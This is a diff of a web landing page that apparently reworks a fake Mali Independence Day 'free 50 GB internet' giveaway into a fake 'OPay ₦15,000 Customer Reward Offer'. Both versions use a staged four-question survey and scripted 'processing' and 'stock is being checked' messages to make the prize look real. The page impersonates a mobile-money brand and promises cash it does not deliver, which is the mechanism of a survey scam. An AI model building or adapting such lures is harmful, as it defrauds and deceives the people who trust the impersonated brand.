@@ -5,7 +5,7 @@
 <html lang="en" dir="ltr">
   
 <head>
-<title>Happy Independence Day Anniversary Mali!</title>
+<title>OPay ₦15,000 Customer Reward Offer!</title>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -343,12 +343,12 @@ Ok
   
   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhw6t0fp8vwbU9vR8acBYaAUvr5J-ejqJoz7VzZL1MQMI1wM23-dBbYSjzVfhwo-ECJjx6vIZXooLqQd2C8owrpuUYj8J1CBsbQFUeaUEIt3AHD5TYAldieDkhClbjZal_uuL3t5cdFQ-0VUOH42w5mU4WGtwl7tY-2YoiIBrEs4PL0r9P6oxTwp2IwXs/s1242/WhatsApp%20Image%202024-09-21%20at%2002.23.04.jpeg" style="width:100%;" />
 <h1 class="heading heading--h1">
-Joyeux Jour de l'Indépendance
+Hello!
 </h1>
   <p class="paragraph">
-Nous célébrons <b>Anniversaire de l'Indépendance du Mali</b>, et pour le commémorer, nous voulons vous offrir 50 Go d'Internet gratuit, disponible pour tous les réseaux.
+Welcome to the <b>OPay ₦15,000 Customer Reward Offer</b>, This year we are celebrating our Anniversary, and to commemorate it, we are giving out ₦15,000 to our Customers.
 <br>
-Répondez aux questions ci-dessous pour gagner le <b>50Go d'Internet gratuit</b>
+Answer the questions below to claim <b>₦15,000 Cash Prize</b>
 </p>
   <br>
 </div>
@@ -358,19 +358,19 @@ Répondez aux questions ci-dessous pour gagner le <b>50Go d'Internet gratuit</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Veuillez patienter un instant...",
-              "Veuillez patienter un instant...",
-              "Veuillez patienter un instant..."
+                     "Please wait a moment...",
+              "Please wait a moment...",
+              "Please wait a moment..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Vous avez répondu à 4/4 des questions
+You have answered 4/4 of the questions
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Vos réponses sont en cours de traitement
+Your answers are being processed
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
@@ -396,20 +396,20 @@ Stock is being checked
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Etes-vous citoyen du Mali?",
-              answers: [ { text: "Oui" }, { text: "Non" } ]
+              title: "Are you Using Opay?",
+              answers: [ { text: "Yes" }, { text: "No" } ]
             },
                                                              {
-              title: "Qui est le président du Mali?",
-              answers: [ { text: "Bah N Daw" }, { text: "Assimi Goïta" }, { text: "Ibrahim Boubacar Keïta" } ]
+              title: "Have you ever participated in Opay Promotions?",
+              answers: [ { text: "Yes" }, { text: "No" } ]
             },
             {
-              title: "Choisissez votre genre?",
-              answers: [ { text: "Mâle" }, { text: "Femelle" } ]
+              title: "Choose your Gender?",
+              answers: [ { text: "Male" }, { text: "Female" } ]
             },
             {
-              title: "Sélectionnez votre service réseau?",
-              answers: [ { text: "ORANGE" }, { text: "SOTELMA-MALITEL" }, { text: "TELECEL" }, { text: "AUTRES" } ]
+              title: "How would you rate the quality of Opay Service?",
+              answers: [ { text: "Very Satisfied" }, { text: "Amazing" }, { text: "Good" }, { text: "Bad" }, { text: "Poor" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
